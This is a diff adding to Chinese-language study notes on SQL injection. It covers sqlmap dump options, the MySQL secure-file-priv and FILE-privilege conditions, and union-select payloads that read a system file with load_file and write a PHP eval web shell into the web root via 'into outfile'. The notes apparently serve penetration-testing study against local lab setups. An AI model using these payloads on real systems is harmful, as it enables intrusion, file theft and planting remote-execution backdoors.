@@ -220,3 +220,37 @@ select ~~~ union select ~~~
 --tables  列出表名
 -T       指定表名
 --columns  列出所有的字段名
+-C       指定字段
+--dump   列出字段内容
+
+post注入
+
+# 读写文件
+
+- 前提条件
+ 我们可以利用SQL注入漏洞读写文件。但是读写文件需要一定的条件
+ 1. secure-file-priv
+ 可以在phpmyadmin中看到该变量
+
+ 该参数在高版本的mysql数据库中限制了文件的导入导出操作。改参数可以写在my.ini配置文件中[mysqld]下。若要配置此参数，需要修改my.ini配置文件，并重启mysql服务。
+
+ 关于该参数的相关说明
+ secure-file-priv 参数配置         含义
+ secure-file-priv=                不对mysqld的导入导出操作做限制
+ secure-file-priv='c:/a/'         限制mysqld的导入导出操作发生在c:/a/下(子目录有效)
+ secure-file-priv=null            限制mysqld不允许导入导出操作
+
+ 2. 当前用户具有文件权限
+ 查询语句[select File_priv from mysql.user where user="root" and host="localhost"]。
+
+ 3. 直到写入目标文件的绝对路径
+
+ - 读取文件操作
+ [?id=-1' union select 1,load_file('C:\\Windows\\System32\\drivers\\etc\\hosts'),3 --+]
+ load_file()
+
+ - 写入文件操作
+ [?id=1' and 1=2 union select 1,'<?php @eval($_REQUEST[777]);?>',3 into outfile 'c:\\phpstudy\\www\\2.php' --+],直接传入参数，页面如果不报错，说明写入成功。可以直接访问写入的文件[http://localhost/1.php]
+  into outfile
+
+ 宽字节注入
